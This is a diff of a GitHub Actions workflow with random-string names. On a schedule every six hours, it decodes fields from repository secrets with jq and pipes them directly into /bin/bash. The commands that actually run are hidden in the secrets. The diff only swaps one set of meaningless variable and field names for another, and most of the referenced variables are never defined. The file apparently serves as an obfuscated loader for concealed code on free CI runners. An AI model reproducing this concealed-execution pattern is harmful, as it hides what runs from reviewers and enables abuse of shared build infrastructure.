@@ -3,34 +3,23 @@ name: sumiaoling7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
-jobs:  # 28497
+    - cron: '56 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sumiaoling7654
         env:
-          i97476: ${{ secrets.i97476 }}
+          u518: ${{ secrets.u518 }}
         run: |
-          echo $i97476 | jq -r .fu24 | /bin/bash
-          echo $umipr07 | jq -r .k1 | /bin/bash
-          echo $dmo882 | jq -r .vjgwy6 | /bin/bash
-          echo $tsi772 | jq -r .qn981 | /bin/bash
-          echo $v00303 | jq -r .rjhb02 | /bin/bash
-          echo $owtu68886 | jq -r .vwtm1 | /bin/bash
-          echo $serhy66 | jq -r .ujuk35608 | /bin/bash
-          echo $ulye0 | jq -r .kwf0 | /bin/bash
-          echo $uvnwv3788 | jq -r .bfiy4132 | /bin/bash
-          echo $hnchf3973 | jq -r .gd01 | /bin/bash
-          echo $cncw3 | jq -r .a6701 | /bin/bash
-          echo $gj1243 | jq -r .gmpr65 | /bin/bash
-          echo $kpwk06 | jq -r .qetxd80329 | /bin/bash
-          echo $lhmi247 | jq -r .ch1 | /bin/bash
-          echo $yo68 | jq -r .h59332 | /bin/bash
-          echo $k10371 | jq -r .tjdlp7 | /bin/bash
-          echo $ux20613 | jq -r .u378 | /bin/bash
-          echo $d7 | jq -r .g13 | /bin/bash
-          echo $s10 | jq -r .h8 | /bin/bash
+          echo $u518 | jq -r .qszwg923 | /bin/bash
+          echo $l3802 | jq -r .pwcj2 | /bin/bash
+          echo $bs4 | jq -r .st09946 | /bin/bash
+          echo $iun172 | jq -r .jbrce09194 | /bin/bash
+          echo $ighp09 | jq -r .tcq428 | /bin/bash
+          echo $xz85777 | jq -r .geavv81 | /bin/bash
+          echo $riia5966 | jq -r .ddl111 | /bin/bash
+          echo $js082 | jq -r .bjehw425 | /bin/bash
+          echo $xn313 | jq -r .nnr39 | /bin/bash
 
